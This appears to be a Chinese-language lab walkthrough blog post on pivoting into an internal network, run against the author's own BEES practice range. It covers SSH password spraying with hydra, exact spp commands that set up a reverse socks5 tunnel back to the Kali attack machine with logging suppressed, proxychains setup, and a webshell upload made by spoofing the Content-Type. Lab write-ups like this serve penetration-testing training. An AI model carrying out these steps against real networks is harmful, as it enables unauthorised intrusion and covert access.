---
title: 【socks 5反向代理】spp内网穿透工具的使用
date: 2025-09-11
categories:
  - 内网攻防
image: images/60.webp
---
# 拓扑图
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131018.png)
目标机器搭建了一个BEES靶场。
**使用kali上传webshell上线BEES靶场。**
# 靶机展示
**kali攻击机**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131112.png)
**centos 7 跳板机**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131121.png)
**windows server 2012  目标机器**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131131.png)
# 使用场景
当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。
使用简单方便，可以更快的对目标网站进行渗透测试。
# 攻击步骤
1.kali对跳板机进行一次密码喷洒，获取跳板机的ssh登录密码，登录到跳板机后，对靶机进行一次信息收集。（发现靶机有两个网卡，并发现20段的主机20.20.20.129主机开启了80端口。）然后我们需要用kali，进攻20段主机，这时候是不通的，无法进攻。这时候我们就需要设置一个代理spp，监听8888端口。实现socks5代理。
2.上传spp到跳板机上，然后在kali上运行spp，让他作为服务端进行启动。监听8888端口，然后centos的spp反向连接kali的8888端口，然后kali服务端与centos进行协商通讯，1080端口作为socks5代理，在kali上监听，在kali上设置代理，就可以直接与20段进行通讯，对内部网络进行渗透。
# 步骤一
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131228.png)
```
使用hydra对跳板机进行密码喷洒，获取ssh密码，并登录到跳板机上。
使用spp，以服务器的形式开启kali的8888端口进行监听。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131256.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131300.png)
```
使用spp，以服务器的形式开启kali的8888端口进行监听。
./spp -type server -proto tcp -listen :8888 -proto ricmp -listen 0.0.0.0 -nolog 1 -noprint 1 &
以服务器的形式运行，协议为tcp，监听8888端口，封装到ricmp协议，在本地进行监听 不保存日志，不在控制台打印日志，在后台运行。
同时kali机器监听8888端口。
```
如下图，spp已经成功监听8888端口。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131325.png)
# 步骤二
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131339.png)
可以使kali通过socks5代理直接访问20段的web网站
```
使用scp命令，把spp上传到跳板机上的tmp目录下:
scp spp root@10.10.10.128:/tmp
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131356.png)
```
到跳板机上查看tmp目录，发现已经成功上传
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131409.png)
```
在跳板机上运行spp，开启socks5代理，连接spp服务器kali的spp服务器8888端口上，以1080端口进行通信
./spp -name “16” -type reverse_socks5_client -server 10.10.10.129:8888 -fromaddr :1080 -proxyproto tcp -proto tcp -nolog 1 -noprint 1 &
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131422.png)
```
这时候kali上就会出现监听1080端口
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131432.png)
```
设置socks 5代理
vim /etc/proxychains4.conf
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131446.png)
```
测试一下是否代理成功。
proxychains rdesktop 20.20.20.129
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131458.png)
# 步骤三
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131507.png)
在目标网站中进行渗透测试，上传webshell，拿下目标服务器。上线蚁剑
```
目标服务器有一个web靶场，这是我搭建的一个靶场，该靶场存在一个任意文件上传漏洞，可以通过改Content-Type:image/png，进行上传php文件。
这里上传过程就不展示了，详细靶场情况可以参考，BEES靶场通过教程
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131524.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131528.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131532.png)
获取到上传文件地址之后，就可以使用webshell连接工具直接连接了，这里有很多工具，就不说了，我这里使用的蚁剑进行连接，需要注意的是需要用蚁剑进行socks5代理进行连接上线
我这里用burp进行socks5代理了，就直接代理8080端口了。
```
直接添加上传文件地址，输入密码，即可连接
http://20.20.20.129/upload/img/20240606101139614.php
到这一步我们已经成功的上线目标服务器了。
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131559.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131603.png)